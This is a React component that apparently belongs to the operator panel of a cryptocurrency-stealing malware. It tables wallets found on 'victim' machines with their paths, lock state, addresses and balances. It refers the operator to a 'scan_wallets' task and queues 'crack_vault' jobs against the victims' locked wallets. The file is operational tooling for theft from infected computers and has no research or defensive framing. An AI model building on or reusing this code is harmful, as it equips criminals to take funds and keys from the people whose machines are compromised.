'use client';
import { useState } from 'react';
import { toast } from 'sonner';
import { Copy, KeyRound, RefreshCw } from 'lucide-react';
import type { Wallet } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { copy, dateTime, mask } from '@/lib/format';
import { mutate } from '@/hooks/useApi';
import { useCanWrite } from '@/components/live-provider';

const tone = (state: string) => state === 'decrypted' ? 'ok' : state === 'locked' ? 'warn' : state === 'corrupt' ? 'bad' : 'default';

export function WalletTable({ victimId, items, loading, refresh }: { victimId: string; items: Wallet[]; loading: boolean; refresh: () => void }) {
  const [busy, setBusy] = useState('');
  const canWrite = useCanWrite();
  if (loading) return <SkeletonRows rows={6} cols={6} />;
  if (items.length === 0) return <Empty title="No wallets detected" hint="Run scan_wallets to enumerate extension and desktop stores." />;

  async function crack(wallet: Wallet) {
    setBusy(wallet.id);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victimId], name: 'crack_vault', params: { target: wallet.targetId }, timeout_sec: 180 });
      toast.success('Crack queued');
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'failed');
    } finally {
      setBusy('');
    }
  }

  return (
    <Table>
      <THead><TR><TH>Target</TH><TH>Kind</TH><TH>Path</TH><TH>State</TH><TH>Address</TH><TH>Balance</TH><TH>Seen</TH><TH /></TR></THead>
      <tbody>
        {items.map((wallet) => (
          <TR key={wallet.id}>
            <TD className="font-mono text-xs">{wallet.targetId}</TD>
            <TD><Badge>{wallet.kind}</Badge></TD>
            <TD className="max-w-[380px] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</TD>
            <TD><Badge tone={tone(wallet.state)}>{wallet.state}</Badge>{wallet.reason ? <span className="ml-1 text-2xs text-muted">{wallet.reason}</span> : null}</TD>
            <TD className="font-mono text-2xs">{wallet.address ? <button className="flex items-center gap-1 text-brand" onClick={() => copy(wallet.address!)}>{mask(wallet.address, 12)} <Copy className="h-2.5 w-2.5" /></button> : '—'}</TD>
            <TD className="num text-warn">{wallet.balance ?? '—'}</TD>
            <TD className="num text-2xs text-muted">{dateTime(wallet.createdAt)}</TD>
            <TD>
              {wallet.state === 'locked' ? (
                <Button size="sm" variant="secondary" loading={busy === wallet.id} disabled={!canWrite} onClick={() => crack(wallet)}><KeyRound className="h-3 w-3" /> crack</Button>
              ) : <Button size="icon" variant="ghost" onClick={refresh}><RefreshCw className="h-3 w-3" /></Button>}
            </TD>
          </TR>
        ))}
      </tbody>
    </Table>
  );
}
